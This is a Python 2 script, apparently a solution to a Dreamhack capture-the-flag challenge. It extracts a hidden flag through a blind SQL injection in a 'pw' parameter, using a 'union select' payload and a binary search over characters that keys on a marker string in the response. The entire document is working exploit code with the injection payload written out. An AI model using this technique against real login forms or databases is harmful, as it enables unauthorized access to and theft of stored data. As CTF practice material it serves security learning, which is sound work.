import urllib2

url = "http://host3.dreamhack.games:8968/?id=asdf&pw=%27%20or%20true%20union%20select%201,2,3,%27"
query_parts = "%27,5%20order%20by%204%23"

flag = ""
avail = "0123456789abcdefghijklmnopqrstuvwxyz"

for i in range(36):
    print(i + 1, " Attempt")
    mid = len(avail) / 2
    start = 0
    end = len(avail) - 1

    while start <= end and start >= 0 and end >= 0 and mid >= 0:
        req = urllib2.Request(url + flag + avail[mid] + query_parts)
        req.add_header("cookie", "[Cookie]")
        source = urllib2.urlopen(req).read()

        if source.find("reset flag") != -1:
            print(flag)
            i = 37
            break

        if source.find("zairowkdlfhdkel") != -1:
            end = mid - 1
            mid = (start + end) / 2
        else:
            start = mid + 1
            mid = (start + end) / 2

    flag += avail[mid]
    avail = avail.replace(avail[mid], "")
    print(avail)

print("flag:"+flag)
